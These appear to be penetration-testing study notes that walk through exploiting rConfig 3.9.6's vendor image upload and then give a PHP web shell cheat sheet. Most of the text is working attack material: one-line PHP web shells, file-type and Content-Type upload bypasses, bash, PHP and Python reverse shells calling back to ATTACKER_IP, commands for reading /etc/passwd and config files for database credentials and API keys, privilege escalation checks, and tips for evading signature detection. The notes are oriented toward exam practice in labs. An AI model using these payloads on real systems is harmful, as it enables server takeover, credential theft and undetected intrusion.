## 🌍 Why PHP Matters in Pentesting

![Image](https://upload.wikimedia.org/wikipedia/commons/thumb/2/27/PHP-logo.svg/3840px-PHP-logo.svg.png)

![Image](https://cdn.phpjabbers.com/files/frees/simple-php-user-login-script.jpg)

![Image](https://v6docs.rconfig.com/images/v6docsimages/settings_download_key.png)

![Image](https://v6docs.rconfig.com/images/gifs/api_docs.gif)

### Key Fact (Keep As It Is)

> PHP is used by 78.6% of all websites whose server-side programming language we know.

- PHP = **Hypertext Preprocessor**
    
- Server-side scripting language
    
- Runs on Apache/Nginx
    
- Processes form data (like login pages)
    
- Executes commands on the server
    

If we see:

```
login.php
index.php
admin.php
```

➡️ That’s a strong clue we may be able to upload a **PHP web shell**.

---

# 🧠 How PHP Works (Attacker Perspective)

When a user submits:

|Field|Example|
|---|---|
|Username|admin|
|Password|password|

The data is:

1. Sent to server
    
2. Processed by PHP
    
3. Response returned as HTML
    

⚠️ Because PHP executes server-side, we can upload a malicious `.php` file that runs commands.

---

# 🐚 What Is a PHP Web Shell?

A PHP web shell is:

- A `.php` file
    
- Uploaded to server
    
- Executed through browser
    
- Runs OS commands
    

---

# 🧪 Hands-On: Exploiting rConfig 3.9.6

We will:

1. Log into rConfig
    
2. Upload PHP web shell
    
3. Bypass file restrictions
    
4. Execute commands
    

---

## Step 1️⃣ Login to rConfig

Default credentials:

```
admin : admin
```

Navigate:

```
Devices → Vendors → Add Vendor
```

---

## Step 2️⃣ Prepare PHP Web Shell

Example basic PHP shell:

```php
<?php system($_GET['cmd']); ?>
```

Or WhiteWinterWolf shell (more advanced).

⚠️ Remove:

- Comments
    
- Author credits
    
- ASCII art
    

Reason: Signature detection / AV triggers.

---

# 🚫 Upload Restriction Problem

rConfig only allows:

```
.png
.jpg
.gif
```

Uploading:

```
shell.php
```

➡️ Fails.

---

# 🔥 Bypass Using Burp Suite

![Image](https://portswigger.net/burp/documentation/desktop/images/getting-started/quick-start-pro-intercepted-request.png)

![Image](https://portswigger.net/burp/documentation/desktop/images/using-match-and-replace/adding-a-custom-match-and-replace-rule.png)

![Image](https://i.sstatic.net/Fkbbs.png)

![Image](https://proxy-offline-browser.com/professional/img/MM3-WebAssistant-Proxy-Offline-Browser-Firefox-Proxy.png)

---

## Step 3️⃣ Configure Proxy

Browser proxy settings:

|Setting|Value|
|---|---|
|IP|127.0.0.1|
|Port|8080|

Burp intercept ON.

---

## Step 4️⃣ Intercept Upload Request

Find POST request:

```http
Content-Type: application/x-php
```

Change to:

```http
Content-Type: image/gif
```

➡️ Forward request.

Server thinks file is image.

Upload successful.

---

# ✅ Confirm Upload

Message:

```
Added new vendor NetVen to Database
```

Shell saved in:

```
/images/vendor/connect.php
```

---

# 🌐 Execute PHP Web Shell

Navigate:

```
/images/vendor/connect.php
```

Example:

```
http://target/images/vendor/connect.php?cmd=whoami
```

Output:

```
www-data
```

---

# 🖥️ Common Commands to Run First

```bash
whoami
```

```bash
hostname
```

```bash
id
```

```bash
uname -a
```

```bash
cat /etc/passwd
```

---

# 📡 Upgrade to Reverse Shell

Start listener:

```bash
nc -lvnp 4444
```

Execute via PHP shell:

```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

Or:

```bash
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

---

# ⚠️ Web Shell Considerations (Important)

When using web shells:

|Issue|Explanation|
|---|---|
|Auto-delete|App may delete uploads|
|Limited interactivity|Not full shell|
|Command chaining fails|whoami && hostname may fail|
|Instability|Non-interactive shell|
|Logging risk|Leaves traces|

---

# 🛡️ OPSEC Best Practices

During engagement:

|Best Practice|Why|
|---|---|
|Delete shell after use|Avoid detection|
|Use reverse shell|More stable|
|Document hashes|Reporting proof|
|Record upload path|Evidence|
|Avoid leaving comments|Signature detection|

---

# 🔍 Example Documentation Entry

Include in report:

- Filename used
    
- Upload path
    
- Timestamp
    
- SHA1 hash
    
- Screenshot proof
    

Example:

```bash
sha1sum connect.php
```

---

# 🔄 Web Shell → Reverse Shell Workflow

```
Find Upload Vulnerability
        ↓
Upload PHP shell
        ↓
Bypass file type restriction
        ↓
Execute commands
        ↓
Spawn reverse shell
        ↓
Delete PHP shell
        ↓
Privilege escalation
```

---

# 🏆 Key Takeaways

✔ PHP is server-side  
✔ Upload vulnerability = RCE potential  
✔ Burp can bypass file type checks  
✔ Change Content-Type header  
✔ Always upgrade to reverse shell  
✔ Clean up artifacts

---

# 🐘 PHP Web Shell Cheat Sheet

### (Upload Bypass + Reverse Shell + Enumeration)

HTB • CPTS • OSCP Focused

---

# 📁 1️⃣ Basic PHP Web Shells

## 🔹 Minimal Command Shell (Exam Favorite)

```php
<?php system($_GET['cmd']); ?>
```

Access:

```
http://target/shell.php?cmd=whoami
```

---

## 🔹 More Reliable Version

```php
<?php echo shell_exec($_GET['cmd']); ?>
```

---

## 🔹 POST-Based Shell (Stealthier)

```php
<?php system($_POST['cmd']); ?>
```

Use with Burp or curl.

---

# 📤 2️⃣ File Upload Bypass Techniques

## 🎯 A. Extension Bypass

|Technique|Example|
|---|---|
|Double extension|shell.php.jpg|
|Mixed case|shell.PHp|
|Alternate extension|shell.phtml|
|PHP5 extension|shell.php5|
|PHP7 extension|shell.php7|
|Null byte (old systems)|shell.php%00.jpg|

---

## 🎯 B. Content-Type Bypass (Burp Suite)

Intercept request:

Original:

```
Content-Type: application/x-php
```

Change to:

```
Content-Type: image/gif
```

Forward request.

✔ Bypasses client-side validation  
✔ Bypasses weak server-side validation

---

## 🎯 C. Magic Bytes Bypass

Add GIF header to PHP file:

```php
GIF89a
<?php system($_GET['cmd']); ?>
```

Server thinks it's an image.

---

## 🎯 D. MIME Tampering via Burp

Change:

```
Content-Type: image/jpeg
```

Even if file is `.php`

---

# 🌐 3️⃣ Find Upload Location

Common locations:

|Server|Path|
|---|---|
|Apache|/var/www/html|
|Uploads|/var/www/html/uploads|
|rConfig|/images/vendor/|
|WordPress|/wp-content/uploads/|

Check manually:

```bash
http://target/uploads/shell.php
```

---

# 🖥️ 4️⃣ Initial Enumeration Commands

Run immediately:

```bash
whoami
```

```bash
id
```

```bash
hostname
```

```bash
pwd
```

```bash
uname -a
```

```bash
cat /etc/passwd
```

```bash
ls -la
```

---

# 📂 Webroot Enumeration

```bash
ls /var/www/html
```

```bash
cat config.php
```

```bash
cat wp-config.php
```

Look for:

- DB credentials
    
- Hardcoded passwords
    
- API keys
    

---

# 📡 5️⃣ Reverse Shell From PHP Web Shell

---

## 🔹 Start Listener

```bash
nc -lvnp 4444
```

---

## 🔹 Bash Reverse Shell

Execute via browser:

```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

---

## 🔹 PHP Reverse Shell (One-Liner)

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"); ?>
```

---

## 🔹 PHP Native Reverse Shell

```php
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

---

## 🔹 Python Reverse Shell

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

---

# 🧰 6️⃣ Upgrade to Fully Interactive TTY

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then:

```bash
export TERM=xterm
```

Then on attacker machine:

```
CTRL + Z
stty raw -echo
fg
```

---

# 🔐 7️⃣ Privilege Escalation Checks

```bash
sudo -l
```

```bash
find / -perm -4000 2>/dev/null
```

```bash
cat /etc/crontab
```

```bash
ps aux
```

```bash
env
```

---

# 🧠 8️⃣ Stability & OPSEC Tips

|Best Practice|Why|
|---|---|
|Upgrade to reverse shell|More stable|
|Delete shell after use|Avoid detection|
|Remove comments|Avoid signature detection|
|Rename file|Avoid easy detection|
|Log file hash|For reporting|

Generate hash:

```bash
sha1sum shell.php
```

---

# 🔥 9️⃣ Full Attack Workflow

```
Find upload vulnerability
        ↓
Upload PHP shell
        ↓
Bypass Content-Type restriction
        ↓
Navigate to shell
        ↓
Enumerate system
        ↓
Spawn reverse shell
        ↓
Upgrade to TTY
        ↓
Privilege escalation
        ↓
Delete web shell
```

---

# 🏆 10️⃣ Most Important Commands (Memorize)

```php
<?php system($_GET['cmd']); ?>
```

```bash
nc -lvnp 4444
```

```bash
bash -i >& /dev/tcp/IP/4444 0>&1
```

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
sudo -l
```

---
